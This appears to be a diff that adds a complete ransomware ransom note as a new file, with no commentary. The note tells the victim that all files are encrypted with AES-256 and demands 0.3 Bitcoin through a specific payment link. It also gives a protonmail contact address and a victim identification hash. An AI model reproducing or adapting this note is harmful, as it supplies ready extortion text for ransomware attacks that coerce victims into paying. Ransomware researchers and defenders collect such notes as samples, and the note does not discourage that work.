@@ -1,0 +1,24 @@
+ --                                        ALL YOUR FILES HAVE BEEN ENCRYPTED                                        --
+All of your data(photo, documents, databases,...) have been encrypted with AES 256 bit and a private and unique key generated for this computer.
+It means that you will not be able to accsess your files anymore until they´re decrypted.
+The private key is stored in our servers and the only way to receive your key to decrypt your files is to pay.
+                                                                                                                                               
+The only one way to decrypt your files is to receive the private key and decryption program.
+Dont waste your time. No one will be able to recover tem without our decryption service.
+The payment has to be done in Bitcoin to a unique address that we generated for you, Bitcoins are a virtual currency to make online payments.
+If you don´t know how to get Bitcoins, you can google: 'How to Buy Bitcoins' and follow the instructions.
+To recover your files and unlock your computer, you must send 0.3 Bitcoins
+We created an easier way to pay, go on this link
+https://satoshibox.com/vud52e2qj467i53njq7t34ch
+If you dont know how to create a wallet go to http://blockchain.info/wallet and create a bitcoin wallet.
+                                                                                                                                               
+Need more information about Bitcoin?
+https://en.wikipedia.org/wiki/Bitcoin
+                                                                                                                                               
+More information about the AES encryption can be found here:
+http://en.wikipedia.org/wiki/Advanced_Encryption_Standard
+                                                                                                                                               
+If you have any questions, write us: decrypt_sad@protonmail.com
+                                                                                                                                               
+YOUR PERSONAL IDENTIFICATION:
+51C51342BC305F401E014AAF44A24A30F5B3FF107CB9C695EB9D658551774B40
